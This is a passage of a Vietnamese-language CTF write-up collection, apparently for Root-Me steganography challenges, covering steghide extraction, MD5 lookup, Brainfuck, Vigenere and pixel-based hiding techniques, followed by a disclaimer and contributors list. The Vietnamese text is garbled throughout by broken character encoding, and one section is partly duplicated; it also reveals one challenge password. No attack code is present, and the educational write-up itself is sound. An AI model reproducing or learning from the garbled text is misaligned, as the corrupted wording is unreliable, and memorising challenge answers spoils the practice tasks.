<p>ƒê·∫øn step2, ta unzip v·ªõi pass l√† flag ·ªü step1:</p>
<p><img src="Steganography/./media/image47.png" alt="" /></p>
<p>ƒê·ªçc file README\#2.txt, ta nh·∫≠n ƒë∆∞·ª£c m·ªôt ƒëo·∫°n ch·ªØ s·ªë kh·∫£ nghi l√† MD5: <strong>18574115dbcd47d71e7eb9da74e45bf2</strong></p>
<p><img src="Steganography/./media/image48.png" alt="" /></p>
<p>S·ª≠ d·ª•ng tool th·ª≠ t√¨m ƒëo·∫°n plaintext c·ªßa n√≥:</p>
<p><img src="Steganography/./media/image49.png" alt="" /></p>
<p>Ta c√≥ key: <strong>*******</strong> (hihi encrypted key). S·ª≠ d·ª•ng steghide ƒë·ªÉ extract file t·ª´ monster.wav:</p>
<p><img src="Steganography/./media/image50.png" alt="" /></p>
<p>Ta t√¨m ƒë∆∞·ª£c password ·ªü step 2: <strong>s3c0nDSt3pIsAls0D0n3</strong></p>
<p>ƒê·∫øn step3, ta c√≥ m·ªôt source web nghi ng·ªù. M·ªü file README trong source code, ta nh·∫≠n ƒë∆∞·ª£c d√≤ng c√≥ n·ªôi dung nh∆∞ ki·ªÉu QR Code s·∫Ω l√† key ·ªü web n√†y li√™n quan ƒë·∫øn flag:</p>
<p><img src="Steganography/./media/image51.png" alt="" /></p>
<p>M·ªü file LICENSE.md, ta nh·∫≠n ƒë∆∞·ª£c m·ªôt ƒëo·∫°n BrainFuck:</p>
<p><img src="Steganography/./media/image52.png" alt="" /></p>
<p>Decode v√† y nh∆∞ d·ª± ƒëo√°n r·∫±ng, c√≥ th·ªÉ QR Code s·∫Ω h·ªó tr·ª£ ta ·ªü step n√†y:</p>
<p><img src="Steganography/./media/image53.png" alt="" /></p>
<p>·ªû file index.html, ta c√≥ ƒë∆∞·ª£c message sau:</p>
<p><img src="Steganography/./media/image54.png" alt="" /></p>
<p>Tui b·ªã d·ª´ng l·∫°i ·ªü ƒë√¢y l√† ch∆∞a nghƒ© ra h∆∞·ªõng ti·∫øp theo.</p>
<hr />
<h2 id="crypto-art"><a class="header" href="#crypto-art">Crypto Art</a></h2>
<p><img src="Steganography/./media/image55.png" alt="" /></p>
<p>ƒê√¢y l√† file Netpbm v·ªõi ƒëu√¥i l√† .ppm.</p>
<p>String file v√† ta ƒë∆∞·ª£c th√¥ng ƒëi·ªáp:</p>
<p><img src="Steganography/./media/image56.png" alt="" /></p>
<p>S·ª≠ d·ª•ng dcode.fr ƒë·ªÉ ti√™n ƒëo√°n cipher v√† ta th·∫•y n√≥ h·ª£p nh·∫•t Vigenere:</p>
<p><img src="Steganography/./media/image57.png" alt="" /></p>
<p>Sau m·ªôt h·ªìi kh√¥ng th·ªÉ auto bruteforce ƒë∆∞·ª£c Vigenere th√¨ b√†i n√†y c√≥ l·∫Ω c·∫ßn ph·∫£i c√≥ key m·ªõi c√≥ th·ªÉ decode. T√¨m hi·ªÉu v·ªÅ ppm th√¨ em ph√°t hi·ªán n√≥ c√≥ th·ªÉ ch√®n th√™m text v√†o trong ƒë√≥ (hide). S·ª≠ d·ª•ng npiet language ƒë·ªÉ phi√™n d·ªãch n√≥ th·ª≠:</p>
<p><img src="Steganography/./media/image58.png" alt="" /></p>
<p>Cu·ªëi c√πng ta c√≥ key: EYJF**** (hihi encrypted key)</p>
<p>Decode v√† nh·∫≠n k·∫øt qu·∫£:</p>
<p><img src="Steganography/./media/image59.png" alt="" /></p>
<p><strong>Flag:</strong> *******</p>
<p><img src="Steganography/./media/image60.png" alt="" /></p>
<hr />
<h2 id="png---pixel-indicator-technique"><a class="header" href="#png---pixel-indicator-technique">PNG - Pixel Indicator Technique</a></h2>
<p>Pixel Indicator Technique l√† k·ªπ thu·∫≠t ·∫©n gi·∫•u th√¥ng tin v√†o pixel c·ªßa ·∫£nh. S·ª≠ d·ª•ng c√¥ng c·ª• stegopit (chuy√™n cho PIT) ƒë·ªÉ ph√¢n t√≠ch ·∫£nh c·ªßa challenge:</p>
<p><img src="Steganography/./media/image61.png" alt="" /></p>
<p>V√† ta t√¨m ƒë∆∞·ª£c hidden data:</p>
<p><strong>Flag:</strong> <strong>*******</strong></p>
<p><img src="Steganography/./media/image62.png" alt="" /></p>
<hr />
<h2 id="png---pixel-value-differencing"><a class="header" href="#png---pixel-value-differencing">PNG - Pixel Value Differencing</a></h2>
<p>ƒê√¢y l√† challenge d·ª±a tr√™n k·ªπ thu·∫≠t PVD (Pixel Value Differencing) ƒë·ªÉ ·∫©n d·∫•u message trong png. T∆∞∆°ng t·ª± challenge, ta s·ª≠ d·ª•ng c√¥ng c·ª• <strong>stegopvd (</strong><a href="https://gist.github.com/dhondta/feaf4f5fb3ed8d1eb7515abe8cde4880">Tinyscript steganography tool implementing the Pixel Value Differencing algorithm ¬∑ GitHub</a>) ƒë·ªÉ extract message:</p>
<p><img src="Steganography/./media/image63.png" alt="" /></p>
<p><strong>Flag:</strong> <strong>*******</strong></p>
<p><img src="Steganography/./media/image64.png" alt="" />
(**<a href="https://gist.github.com/dhondta/feaf4f5fb3ed8d1eb7515abe8cde4880">Tinyscript steganography tool implementing the Pixel Value Differencing algorithm ¬∑ GitHub</a>) ƒë·ªÉ extract message:</p>
<p><img src="Steganography/./media/image63.png" alt="Graphical user interface Description automatically generated" /></p>
<p><strong>Flag:</strong> <strong>*******</strong></p>
<p><img src="Steganography/./media/image64.png" alt="A screenshot of a computer Description automatically generated" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="disclaimer"><a class="header" href="#disclaimer">Disclaimer</a></h1>
<p>This project is intended <strong>for educational purposes only</strong>.</p>
<p>By using any materials, scripts, or walkthroughs provided in this repository, you agree to the following:</p>
<ul>
<li>You will not use any information or tools provided here for malicious or unauthorized purposes.</li>
<li>All challenges and labs referenced are publicly accessible platforms or practice environments (e.g., Root-Me).</li>
<li>The content is shared for the purpose of learning cybersecurity, penetration testing, and ethical hacking techniques.</li>
<li>The author(s) are <strong>not responsible</strong> for any misuse, damage, or legal consequences resulting from the use of this content.</li>
</ul>
<p>If you're unsure about whether your actions are ethical or legal, you probably shouldn't do them.</p>
<blockquote>
<p><strong>Stay ethical. Hack responsibly. Learn continuously.</strong></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="contributors-1"><a class="header" href="#contributors-1">Contributors</a></h1>
<p>Thank you to everyone who has contributed to this project! Your efforts help make this resource better for the community.</p>
<h2 id="how-to-contribute"><a class="header" href="#how-to-contribute">How to Contribute</a></h2>
<ol>
<li>Fork the repository and create your branch from <code>main</code>.</li>
<li>Add your content or improvements.</li>
<li>Open a pull request with a clear description of your changes.</li>
</ol>
<h2 id="contributors-list"><a class="header" href="#contributors-list">Contributors List</a></h2>
<ul>
<li><a href="https://github.com/nh4ttruong">nh4ttruong</a> (maintainer)</li>
</ul>
<hr />
<p><em>If you contributed and are not listed, please open a PR or issue to be added!</em></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr-ef4e11c1.min.js"></script>
        <script src="mark-09e88c2c.min.js"></script>
        <script src="searcher-9aeb6ddf.js"></script>

        <script src="clipboard-1626706a.min.js"></script>
        <script src="highlight-abc7f01d.js"></script>
        <script src="book-9576a2db.js"></script>

        <!-- Custom JS scripts -->
        <script src="js/medium-zoom-11d3e061.min.js"></script>
        <script src="js/image-zoom-07fd8d4c.js"></script>

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>


    </div>
    </body>
</html>
